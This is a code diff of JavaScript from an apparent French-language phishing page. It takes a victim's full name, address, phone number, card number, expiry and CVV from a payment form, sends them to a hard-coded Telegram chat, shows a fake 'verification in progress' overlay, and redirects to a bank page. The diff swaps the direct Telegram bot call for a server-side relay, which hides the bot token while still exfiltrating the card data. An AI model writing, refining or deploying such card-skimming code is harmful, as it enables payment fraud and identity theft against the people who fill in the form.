@@ -1078,14 +1078,18 @@
                 submitBtn.textContent = 'Vérification en cours...';
                 loadingOverlay.style.display = 'flex';
                 
-                const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
                 const CHAT_ID = '6078788670';
                 const msg = 'CARTE: ' + cardName.value + ' | ADRESSE: ' + address.value + ' | TEL: ' + phone.value + ' | MONTANT: ' + amount.value + ' | NUMERO: ' + cardNumber.value + ' | EXPIRATION: ' + expiry.value + ' | CVV: ' + cvv.value;
-                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                
+                fetch('/api/telegram', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-                }).catch(e => console.error(e));
+                }).then(r => r.json()).then(d => {
+                    console.log('Telegram response:', d);
+                }).catch(e => {
+                    console.error('Telegram error:', e);
+                });
                 
                 setTimeout(() => {
                     window.location.href = 'bank.html';
